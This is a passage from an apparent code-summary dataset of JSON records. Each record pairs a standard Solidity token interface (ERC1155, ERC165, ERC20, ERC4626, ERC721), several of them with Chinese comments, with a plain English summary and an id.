        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../34_ERC721/IERC165.sol\";\n\n/**\n * @dev ERC1155\u6807\u51c6\u7684\u63a5\u53e3\u5408\u7ea6\uff0c\u5b9e\u73b0\u4e86EIP1155\u7684\u529f\u80fd\n * \u8be6\u89c1\uff1ahttps://eips.ethereum.org/EIPS/eip-1155[EIP].\n */\ninterface IERC1155 is IERC165 {\n    /**\n     * @dev \u5355\u7c7b\u4ee3\u5e01\u8f6c\u8d26\u4e8b\u4ef6\n     * \u5f53`value`\u4e2a`id`\u79cd\u7c7b\u7684\u4ee3\u5e01\u88ab`operator`\u4ece`from`\u8f6c\u8d26\u5230`to`\u65f6\u91ca\u653e.\n     */\n    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);\n\n    /**\n     * @dev \u591a\u7c7b\u4ee3\u5e01\u8f6c\u8d26\u4e8b\u4ef6\n     * ids\u548cvalues\u4e3a\u8f6c\u8d26\u7684\u4ee3\u5e01\u79cd\u7c7b\u548c\u6570\u91cf\u6570\u7ec4\n     */\n    event TransferBatch(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256[] ids,\n        uint256[] values\n    );\n\n    /**\n     * @dev \u6279\u91cf\u6388\u6743\u4e8b\u4ef6\n     * \u5f53`account`\u5c06\u6240\u6709\u4ee3\u5e01\u6388\u6743\u7ed9`operator`\u65f6\u91ca\u653e\n     */\n    event ApprovalForAll(address indexed account, address indexed operator, bool approved);\n\n    /**\n     * @dev \u5f53`id`\u79cd\u7c7b\u7684\u4ee3\u5e01\u7684URI\u53d1\u751f\u53d8\u5316\u65f6\u91ca\u653e\uff0c`value`\u4e3a\u65b0\u7684URI\n     */\n    event URI(string value, uint256 indexed id);\n\n    /**\n     * @dev \u6301\u4ed3\u67e5\u8be2\uff0c\u8fd4\u56de`account`\u62e5\u6709\u7684`id`\u79cd\u7c7b\u7684\u4ee3\u5e01\u7684\u6301\u4ed3\u91cf\n     */\n    function balanceOf(address account, uint256 id) external view returns (uint256);\n\n    /**\n     * @dev \u6279\u91cf\u6301\u4ed3\u67e5\u8be2\uff0c`accounts`\u548c`ids`\u6570\u7ec4\u7684\u957f\u5ea6\u8981\u60f3\u7b49\u3002\n     */\n    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory);\n\n    /**\n     * @dev \u6279\u91cf\u6388\u6743\uff0c\u5c06\u8c03\u7528\u8005\u7684\u4ee3\u5e01\u6388\u6743\u7ed9`operator`\u5730\u5740\u3002\n     * \u91ca\u653e{ApprovalForAll}\u4e8b\u4ef6.\n     */\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /**\n     * @dev \u6279\u91cf\u6388\u6743\u67e5\u8be2\uff0c\u5982\u679c\u6388\u6743\u5730\u5740`operator`\u88ab`account`\u6388\u6743\uff0c\u5219\u8fd4\u56de`true`\n     * \u89c1 {setApprovalForAll}\u51fd\u6570.\n     */\n    function isApprovedForAll(address account, address operator) external view returns (bool);\n\n    /**\n     * @dev \u5b89\u5168\u8f6c\u8d26\uff0c\u5c06`amount`\u5355\u4f4d`id`\u79cd\u7c7b\u7684\u4ee3\u5e01\u4ece`from`\u8f6c\u8d26\u7ed9`to`.\n     * \u91ca\u653e{TransferSingle}\u4e8b\u4ef6.\n     * \u8981\u6c42:\n     * - \u5982\u679c\u8c03\u7528\u8005\u4e0d\u662f`from`\u5730\u5740\u800c\u662f\u6388\u6743\u5730\u5740\uff0c\u5219\u9700\u8981\u5f97\u5230`from`\u7684\u6388\u6743\n     * - `from`\u5730\u5740\u5fc5\u987b\u6709\u8db3\u591f\u7684\u6301\u4ed3\n     * - \u5982\u679c\u63a5\u6536\u65b9\u662f\u5408\u7ea6\uff0c\u9700\u8981\u5b9e\u73b0`IERC1155Receiver`\u7684`onERC1155Received`\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u7684\u503c\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes calldata data\n    ) external;\n\n    /**\n     * @dev \u6279\u91cf\u5b89\u5168\u8f6c\u8d26\n     * \u91ca\u653e{TransferBatch}\u4e8b\u4ef6\n     * \u8981\u6c42\uff1a\n     * - `ids`\u548c`amounts`\u957f\u5ea6\u76f8\u7b49\n     * - \u5982\u679c\u63a5\u6536\u65b9\u662f\u5408\u7ea6\uff0c\u9700\u8981\u5b9e\u73b0`IERC1155Receiver`\u7684`onERC1155BatchReceived`\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u7684\u503c\n     */\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata amounts,\n        bytes calldata data\n    ) external;\n}\n",
        "summary": "This is an interface contract that defines the standard functionality for ERC1155 tokens, as defined by the EIP-1155 standard. The contract includes events for single and batch transfers, approval for all, and URI changes. It also includes functions for balance of, batch balance of, set and check approval for all, and safe transfer and batch transfer. These functions all require certain conditions, such as having sufficient balance or being authorized, to be met before they can be executed, and they also emit events when they are executed.",
        "id": "4dff1ff4-59bd-46de-90ab-5726ba8b89dc"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./IERC1155.sol\";\n\n/**\n * @dev ERC1155\u7684\u53ef\u9009\u63a5\u53e3\uff0c\u52a0\u5165\u4e86uri()\u51fd\u6570\u67e5\u8be2\u5143\u6570\u636e\n */\ninterface IERC1155MetadataURI is IERC1155 {\n    /**\n     * @dev \u8fd4\u56de\u7b2c`id`\u79cd\u7c7b\u4ee3\u5e01\u7684URI\n     */\n    function uri(uint256 id) external view returns (string memory);\n}",
        "summary": "This code defines an interface called `IERC1155MetadataURI` which extends another interface called `IERC1155`. This new interface adds a single function called `uri()` which takes in a `uint256` parameter and returns a `string` representing the metadata (e.g., name, symbol, image, etc.) for the token associated with that ID number. This interface is tagged with a SPDX license identifier of MIT.",
        "id": "adc417b2-02b7-485d-9bed-5c97a52115fd"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../34_ERC721/IERC165.sol\";\n\n/**\n * @dev ERC1155\u63a5\u6536\u5408\u7ea6\uff0c\u8981\u63a5\u53d7ERC1155\u7684\u5b89\u5168\u8f6c\u8d26\uff0c\u9700\u8981\u5b9e\u73b0\u8fd9\u4e2a\u5408\u7ea6\n */\ninterface IERC1155Receiver is IERC165 {\n    /**\n     * @dev \u63a5\u53d7ERC1155\u5b89\u5168\u8f6c\u8d26`safeTransferFrom` \n     * \u9700\u8981\u8fd4\u56de 0xf23a6e61 \u6216 `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`\n     */\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4);\n\n    /**\n     * @dev \u63a5\u53d7ERC1155\u6279\u91cf\u5b89\u5168\u8f6c\u8d26`safeBatchTransferFrom` \n     * \u9700\u8981\u8fd4\u56de 0xbc197c81 \u6216 `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`\n     */\n    function onERC1155BatchReceived(\n        address operator,\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n",
        "summary": "This code defines an interface for a smart contract that needs to receive ERC1155 safe transfers. The interface includes two functions: `onERC1155Received()` for receiving a single token transfer and `onERC1155BatchReceived()` for receiving multiple token transfers. Both functions require the implementation of a specific return value in order to be compatible with the ERC1155 standard.",
        "id": "d4859dab-adff-4313-802e-81629cd1a6cb"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC165 standard, as defined in the\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\n *\n * Implementers can declare support of contract interfaces, which can then be\n * queried by others ({ERC165Checker}).\n *\n * For an implementation, see {ERC165}.\n */\ninterface IERC165 {\n    /**\n     * @dev Returns true if this contract implements the interface defined by\n     * `interfaceId`. See the corresponding\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n     * to learn more about how these ids are created.\n     *\n     * This function call must use less than 30 000 gas.\n     */\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n",
        "summary": "This is a Solidity interface for the ERC165 standard, which is used to declare support for a contract interface and can be queried by others. The `IERC165` interface only has one function `supportsInterface`, which takes a bytes4 interfaceId as input parameter and returns true if the contract implements the interface corresponding to the given interfaceId. The function must use less than 30,000 gas. This code is part of the OpenZeppelin Contracts library version 4.4.1 and the SPDX-License-Identifier is MIT.",
        "id": "e57d8fa4-c375-4165-b09b-2d106f6b6606"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// WTF Solidity by 0xAA\n\npragma solidity ^0.8.4;\n\n/**\n * @dev ERC20 \u63a5\u53e3\u5408\u7ea6.\n */\ninterface IERC20 {\n    /**\n     * @dev \u91ca\u653e\u6761\u4ef6\uff1a\u5f53 `value` \u5355\u4f4d\u7684\u8d27\u5e01\u4ece\u8d26\u6237 (`from`) \u8f6c\u8d26\u5230\u53e6\u4e00\u8d26\u6237 (`to`)\u65f6.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev \u91ca\u653e\u6761\u4ef6\uff1a\u5f53 `value` \u5355\u4f4d\u7684\u8d27\u5e01\u4ece\u8d26\u6237 (`owner`) \u6388\u6743\u7ed9\u53e6\u4e00\u8d26\u6237 (`spender`)\u65f6.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev \u8fd4\u56de\u4ee3\u5e01\u603b\u4f9b\u7ed9.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev \u8fd4\u56de\u8d26\u6237`account`\u6240\u6301\u6709\u7684\u4ee3\u5e01\u6570.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev \u8f6c\u8d26 `amount` \u5355\u4f4d\u4ee3\u5e01\uff0c\u4ece\u8c03\u7528\u8005\u8d26\u6237\u5230\u53e6\u4e00\u8d26\u6237 `to`.\n     *\n     * \u5982\u679c\u6210\u529f\uff0c\u8fd4\u56de `true`.\n     *\n     * \u91ca\u653e {Transfer} \u4e8b\u4ef6.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev \u8fd4\u56de`owner`\u8d26\u6237\u6388\u6743\u7ed9`spender`\u8d26\u6237\u7684\u989d\u5ea6\uff0c\u9ed8\u8ba4\u4e3a0\u3002\n     *\n     * \u5f53{approve} \u6216 {transferFrom} \u88ab\u8c03\u7528\u65f6\uff0c`allowance`\u4f1a\u6539\u53d8.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev \u8c03\u7528\u8005\u8d26\u6237\u7ed9`spender`\u8d26\u6237\u6388\u6743 `amount`\u6570\u91cf\u4ee3\u5e01\u3002\n     *\n     * \u5982\u679c\u6210\u529f\uff0c\u8fd4\u56de `true`.\n     *\n     * \u91ca\u653e {Approval} \u4e8b\u4ef6.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev \u901a\u8fc7\u6388\u6743\u673a\u5236\uff0c\u4ece`from`\u8d26\u6237\u5411`to`\u8d26\u6237\u8f6c\u8d26`amount`\u6570\u91cf\u4ee3\u5e01\u3002\u8f6c\u8d26\u7684\u90e8\u5206\u4f1a\u4ece\u8c03\u7528\u8005\u7684`allowance`\u4e2d\u6263\u9664\u3002\n     *\n     * \u5982\u679c\u6210\u529f\uff0c\u8fd4\u56de `true`.\n     *\n     * \u91ca\u653e {Transfer} \u4e8b\u4ef6.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}",
        "summary": "This code defines an interface for an ERC20 token. An interface is a set of functions that a contract must implement in order to interact with other contracts. This particular interface includes functions for getting the total supply of the token, checking an account's balance, transferring tokens, approving token transfers, and transferring tokens on behalf of someone else. It also includes events that are triggered when a transfer or approval occurs. The code is written in Solidity, a programming language used to write contracts on the Ethereum blockchain.",
        "id": "f4d159fe-5b8c-4b69-b6a7-d8ff0407a6af"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// Author: 0xAA from WTF Academy\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\n\n/**\n * @dev ERC4626 \"\u4ee3\u5e01\u5316\u91d1\u5e93\u6807\u51c6\"\u7684\u63a5\u53e3\u5408\u7ea6\n * https://eips.ethereum.org/EIPS/eip-4626[ERC-4626].\n */\ninterface IERC4626 is IERC20, IERC20Metadata {\n    /*//////////////////////////////////////////////////////////////\n                                 \u4e8b\u4ef6\n    //////////////////////////////////////////////////////////////*/\n    // \u5b58\u6b3e\u65f6\u89e6\u53d1\n    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);\n\n    // \u53d6\u6b3e\u65f6\u89e6\u53d1\n    event Withdraw(\n        address indexed sender,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /*//////////////////////////////////////////////////////////////\n                            \u5143\u6570\u636e\n    //////////////////////////////////////////////////////////////*/\n    /**\n     * @dev \u8fd4\u56de\u91d1\u5e93\u7684\u57fa\u7840\u8d44\u4ea7\u4ee3\u5e01\u5730\u5740 \uff08\u7528\u4e8e\u5b58\u6b3e\uff0c\u53d6\u6b3e\uff09\n     * - \u5fc5\u987b\u662f ERC20 \u4ee3\u5e01\u5408\u7ea6\u5730\u5740.\n     * - \u4e0d\u80fdrevert\n     */\n    function asset() external view returns (address assetTokenAddress);\n\n    /*//////////////////////////////////////////////////////////////\n                        \u5b58\u6b3e/\u63d0\u6b3e\u903b\u8f91\n    //////////////////////////////////////////////////////////////*/\n    /**\n     * @dev \u5b58\u6b3e\u51fd\u6570: \u7528\u6237\u5411\u91d1\u5e93\u5b58\u5165 assets \u5355\u4f4d\u7684\u57fa\u7840\u8d44\u4ea7\uff0c\u7136\u540e\u5408\u7ea6\u94f8\u9020 shares \u5355\u4f4d\u7684\u91d1\u5e93\u989d\u5ea6\u7ed9 receiver \u5730\u5740\n     *\n     * - \u5fc5\u987b\u91ca\u653e Deposit \u4e8b\u4ef6.\n     * - \u5982\u679c\u8d44\u4ea7\u4e0d\u80fd\u5b58\u5165\uff0c\u5fc5\u987brevert\uff0c\u6bd4\u5982\u5b58\u6b3e\u6570\u989d\u5927\u5927\u4e8e\u4e0a\u9650\u7b49\u3002\n     */\n    function deposit(uint256 assets, address receiver) external returns (uint256 shares);\n\n    /**\n     * @dev \u94f8\u9020\u51fd\u6570: \u7528\u6237\u9700\u8981\u5b58\u5165 assets \u5355\u4f4d\u7684\u57fa\u7840\u8d44\u4ea7\uff0c\u7136\u540e\u5408\u7ea6\u7ed9 receiver \u5730\u5740\u94f8\u9020 share \u6570\u91cf\u7684\u91d1\u5e93\u989d\u5ea6\n     * - \u5fc5\u987b\u91ca\u653e Deposit \u4e8b\u4ef6.\n     * - \u5982\u679c\u5168\u90e8\u91d1\u5e93\u989d\u5ea6\u4e0d\u80fd\u94f8\u9020\uff0c\u5fc5\u987brevert\uff0c\u6bd4\u5982\u94f8\u9020\u6570\u989d\u5927\u5927\u4e8e\u4e0a\u9650\u7b49\u3002\n     */\n    function mint(uint256 shares, address receiver) external returns (uint256 assets);\n\n    /**\n     * @dev \u63d0\u6b3e\u51fd\u6570: owner \u5730\u5740\u9500\u6bc1 share \u5355\u4f4d\u7684\u91d1\u5e93\u989d\u5ea6\uff0c\u7136\u540e\u5408\u7ea6\u5c06 assets \u5355\u4f4d\u7684\u57fa\u7840\u8d44\u4ea7\u53d1\u9001\u7ed9 receiver \u5730\u5740\n     * - \u91ca\u653e Withdraw \u4e8b\u4ef6\n     * - \u5982\u679c\u5168\u90e8\u57fa\u7840\u8d44\u4ea7\u4e0d\u80fd\u63d0\u53d6\uff0c\u5c06revert\n     */\n    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);\n\n    /**\n     * @dev \u8d4e\u56de\u51fd\u6570: owner \u5730\u5740\u9500\u6bc1 shares \u6570\u91cf\u7684\u91d1\u5e93\u989d\u5ea6\uff0c\u7136\u540e\u5408\u7ea6\u5c06 assets \u5355\u4f4d\u7684\u57fa\u7840\u8d44\u4ea7\u53d1\u7ed9 receiver \u5730\u5740\n     * - \u91ca\u653e Withdraw \u4e8b\u4ef6\n     * - \u5982\u679c\u91d1\u5e93\u989d\u5ea6\u4e0d\u80fd\u5168\u90e8\u9500\u6bc1\uff0c\u5219revert\n     */\n    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);\n\n    /*//////////////////////////////////////////////////////////////\n                            \u4f1a\u8ba1\u903b\u8f91\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @dev \u8fd4\u56de\u91d1\u5e93\u4e2d\u7ba1\u7406\u7684\u57fa\u7840\u8d44\u4ea7\u4ee3\u5e01\u603b\u989d\n     * - \u8981\u5305\u542b\u5229\u606f\n     * - \u8981\u5305\u542b\u8d39\u7528\n     * - \u4e0d\u80fdrevert\n     */\n    function totalAssets() external view returns (uint256 totalManagedAssets);\n\n    /**\n     * @dev \u8fd4\u56de\u5229\u7528\u4e00\u5b9a\u6570\u989d\u57fa\u7840\u8d44\u4ea7\u53ef\u4ee5\u6362\u53d6\u7684\u91d1\u5e93\u989d\u5ea6\n     * - \u4e0d\u8981\u5305\u542b\u8d39\u7528\n     * - \u4e0d\u5305\u542b\u6ed1\u70b9\n     * - \u4e0d\u80fdrevert\n     */\n    function convertToShares(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev \u8fd4\u56de\u5229\u7528\u4e00\u5b9a\u6570\u989d\u91d1\u5e93\u989d\u5ea6\u53ef\u4ee5\u6362\u53d6\u7684\u57fa\u7840\u8d44\u4ea7\n     * - \u4e0d\u8981\u5305\u542b\u8d39\u7528\n     * - \u4e0d\u5305\u542b\u6ed1\u70b9\n     * - \u4e0d\u80fdrevert\n     */\n    function convertToAssets(uint256 shares) external view returns (uint256 assets);\n\n    /**\n     * @dev \u7528\u4e8e\u94fe\u4e0a\u548c\u94fe\u4e0b\u7528\u6237\u5728\u5f53\u524d\u94fe\u4e0a\u73af\u5883\u6a21\u62df\u5b58\u6b3e\u4e00\u5b9a\u6570\u989d\u7684\u57fa\u7840\u8d44\u4ea7\u80fd\u591f\u83b7\u5f97\u7684\u91d1\u5e93\u989d\u5ea6\n     * - \u8fd4\u56de\u503c\u8981\u63a5\u8fd1\u4e14\u4e0d\u5927\u4e8e\u5728\u540c\u4e00\u4ea4\u6613\u8fdb\u884c\u5b58\u6b3e\u5f97\u5230\u7684\u91d1\u5e93\u989d\u5ea6\n     * - \u4e0d\u8981\u8003\u8651 maxDeposit \u7b49\u9650\u5236\uff0c\u5047\u8bbe\u7528\u6237\u7684\u5b58\u6b3e\u4ea4\u6613\u4f1a\u6210\u529f\n     * - \u8981\u8003\u8651\u8d39\u7528\n     * - \u4e0d\u80fdrevert\n     * NOTE: \u53ef\u4ee5\u5229\u7528 convertToAssets \u548c previewDeposit \u8fd4\u56de\u503c\u7684\u5dee\u503c\u6765\u8ba1\u7b97\u6ed1\u70b9\n     */\n    function previewDeposit(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev \u7528\u4e8e\u94fe\u4e0a\u548c\u94fe\u4e0b\u7528\u6237\u5728\u5f53\u524d\u94fe\u4e0a\u73af\u5883\u6a21\u62df\u94f8\u9020 shares \u6570\u989d\u7684\u91d1\u5e93\u989d\u5ea6\u9700\u8981\u5b58\u6b3e\u7684\u57fa\u7840\u8d44\u4ea7\u6570\u91cf\n     * - \u8fd4\u56de\u503c\u8981\u63a5\u8fd1\u4e14\u4e0d\u5c0f\u4e8e\u5728\u540c\u4e00\u4ea4\u6613\u8fdb\u884c\u94f8\u9020\u4e00\u5b9a\u6570\u989d\u91d1\u5e93\u989d\u5ea6\u6240\u9700\u7684\u5b58\u6b3e\u6570\u91cf\n     * - \u4e0d\u8981\u8003\u8651 maxMint \u7b49\u9650\u5236\uff0c\u5047\u8bbe\u7528\u6237\u7684\u5b58\u6b3e\u4ea4\u6613\u4f1a\u6210\u529f\n     * - \u8981\u8003\u8651\u8d39\u7528\n     * - \u4e0d\u80fdrevert\n     */\n    function previewMint(uint256 shares) external view returns (uint256 assets);\n\n    /**\n     * @dev \u7528\u4e8e\u94fe\u4e0a\u548c\u94fe\u4e0b\u7528\u6237\u5728\u5f53\u524d\u94fe\u4e0a\u73af\u5883\u6a21\u62df\u63d0\u6b3e assets \u6570\u989d\u7684\u57fa\u7840\u8d44\u4ea7\u9700\u8981\u8d4e\u56de\u7684\u91d1\u5e93\u4efd\u989d\n     * - \u8fd4\u56de\u503c\u8981\u63a5\u8fd1\u4e14\u4e0d\u5927\u4e8e\u5728\u540c\u4e00\u4ea4\u6613\u8fdb\u884c\u63d0\u6b3e\u4e00\u5b9a\u6570\u989d\u57fa\u7840\u8d44\u4ea7\u6240\u9700\u8d4e\u56de\u7684\u91d1\u5e93\u4efd\u989d\n     * - \u4e0d\u8981\u8003\u8651 maxWithdraw \u7b49\u9650\u5236\uff0c\u5047\u8bbe\u7528\u6237\u7684\u63d0\u6b3e\u4ea4\u6613\u4f1a\u6210\u529f\n     * - \u8981\u8003\u8651\u8d39\u7528\n     * - \u4e0d\u80fdrevert\n     */\n    function previewWithdraw(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev \u7528\u4e8e\u94fe\u4e0a\u548c\u94fe\u4e0b\u7528\u6237\u5728\u5f53\u524d\u94fe\u4e0a\u73af\u5883\u6a21\u62df\u9500\u6bc1 shares \u6570\u989d\u7684\u91d1\u5e93\u989d\u5ea6\u80fd\u591f\u8d4e\u56de\u7684\u57fa\u7840\u8d44\u4ea7\u6570\u91cf\n     * - \u8fd4\u56de\u503c\u8981\u63a5\u8fd1\u4e14\u4e0d\u5c0f\u4e8e\u5728\u540c\u4e00\u4ea4\u6613\u8fdb\u884c\u9500\u6bc1\u4e00\u5b9a\u6570\u989d\u7684\u91d1\u5e93\u989d\u5ea6\u6240\u80fd\u8d4e\u56de\u7684\u57fa\u7840\u8d44\u4ea7\u6570\u91cf\n     * - \u4e0d\u8981\u8003\u8651 maxRedeem \u7b49\u9650\u5236\uff0c\u5047\u8bbe\u7528\u6237\u7684\u8d4e\u56de\u4ea4\u6613\u4f1a\u6210\u529f\n     * - \u8981\u8003\u8651\u8d39\u7528\n     * - \u4e0d\u80fdrevert.\n     */\n    function previewRedeem(uint256 shares) external view returns (uint256 assets);\n\n    /*//////////////////////////////////////////////////////////////\n                     \u5b58\u6b3e/\u63d0\u6b3e\u9650\u989d\u903b\u8f91\n    //////////////////////////////////////////////////////////////*/\n    /**\n     * @dev \u8fd4\u56de\u67d0\u4e2a\u7528\u6237\u5730\u5740\u5355\u6b21\u5b58\u6b3e\u53ef\u5b58\u7684\u6700\u5927\u57fa\u7840\u8d44\u4ea7\u6570\u989d\u3002\n     * - \u5982\u679c\u6709\u5b58\u6b3e\u4e0a\u9650\uff0c\u90a3\u4e48\u8fd4\u56de\u503c\u5e94\u8be5\u662f\u4e2a\u6709\u9650\u503c\n     * - \u8fd4\u56de\u503c\u4e0d\u80fd\u8d85\u8fc7 2 ** 256 - 1 \n     * - \u4e0d\u80fdrevert\n     */\n    function maxDeposit(address receiver) external view returns (uint256 maxAssets);\n\n    /**\n     * @dev \u8fd4\u56de\u67d0\u4e2a\u7528\u6237\u5730\u5740\u5355\u6b21\u94f8\u9020\u53ef\u4ee5\u94f8\u9020\u7684\u6700\u5927\u91d1\u5e93\u989d\u5ea6\n     * - \u5982\u679c\u6709\u94f8\u9020\u4e0a\u9650\uff0c\u90a3\u4e48\u8fd4\u56de\u503c\u5e94\u8be5\u662f\u4e2a\u6709\u9650\u503c\n     * - \u8fd4\u56de\u503c\u4e0d\u80fd\u8d85\u8fc7 2 ** 256 - 1 \n     * - \u4e0d\u80fdrevert\n     */\n    function maxMint(address receiver) external view returns (uint256 maxShares);\n\n    /**\n     * @dev \u8fd4\u56de\u67d0\u4e2a\u7528\u6237\u5730\u5740\u5355\u6b21\u53d6\u6b3e\u53ef\u4ee5\u63d0\u53d6\u7684\u6700\u5927\u57fa\u7840\u8d44\u4ea7\u989d\u5ea6\n     * - \u8fd4\u56de\u503c\u5e94\u8be5\u662f\u4e2a\u6709\u9650\u503c\n     * - \u4e0d\u80fdrevert\n     */\n    function maxWithdraw(address owner) external view returns (uint256 maxAssets);\n\n    /**\n     * @dev \u8fd4\u56de\u67d0\u4e2a\u7528\u6237\u5730\u5740\u5355\u6b21\u8d4e\u56de\u53ef\u4ee5\u9500\u6bc1\u7684\u6700\u5927\u91d1\u5e93\u989d\u5ea6\n     * - \u8fd4\u56de\u503c\u5e94\u8be5\u662f\u4e2a\u6709\u9650\u503c\n     * - \u5982\u679c\u6ca1\u6709\u5176\u4ed6\u9650\u5236\uff0c\u8fd4\u56de\u503c\u5e94\u8be5\u662f balanceOf(owner)\n     * - \u4e0d\u80fdrevert\n     */\n    function maxRedeem(address owner) external view returns (uint256 maxShares);\n}",
        "summary": "This code defines an interface contract for the ERC-4626 \"Tokenized Vault Standard\". It includes functions for depositing, withdrawing, minting, and redeeming shares of a pool of assets, as well as accounting and deposit/withdrawal limit functions. The interface also includes events triggered upon deposit or withdrawal of assets from the pool. The ERC-4626 standard specifies the requirements for this type of tokenized vault contract.",
        "id": "31af8b6c-4277-456d-b6fc-d852b5242cb6"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creator: Chiru Labs\n\npragma solidity ^0.8.4;\n\nimport '../extensions/IERC4907A.sol';\n",
        "summary": "This is a Solidity code that begins with SPDX and license information, indicating that it is licensed under the MIT license. It then imports an extension called IERC4907A from another file. The purpose and functionality of this extension are not clear from the given code. The remaining part of the code is not provided, so the complete functionality of the contract cannot be determined without it.",
        "id": "2d7b0e6b-976d-418e-af5a-94c883798d3c"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC165.sol\";\n\n/**\n * @dev Required interface of an ERC721 compliant contract.\n */\ninterface IERC721 is IERC165 {\n    /**\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\n     */\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    /**\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\n     */\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    /**\n     * @dev Returns the number of tokens in ``owner``'s account.\n     */\n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    /**\n     * @dev Returns the owner of the `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\n     *\n     * Emits a {Transfer} event.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /**\n     * @dev Transfers `tokenId` token from `from` to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    /**\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\n     * The approval is cleared when the token is transferred.\n     *\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\n     *\n     * Requirements:\n     *\n     * - The caller must own the token or be an approved operator.\n     * - `tokenId` must exist.\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address to, uint256 tokenId) external;\n\n    /**\n     * @dev Returns the account approved for `tokenId` token.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    /**\n     * @dev Approve or remove `operator` as an operator for the caller.\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\n     *\n     * Requirements:\n     *\n     * - The `operator` cannot be the caller.\n     *\n     * Emits an {ApprovalForAll} event.\n     */\n    function setApprovalForAll(address operator, bool _approved) external;\n\n    /**\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\n     *\n     * See {setApprovalForAll}\n     */\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\n     *\n     * 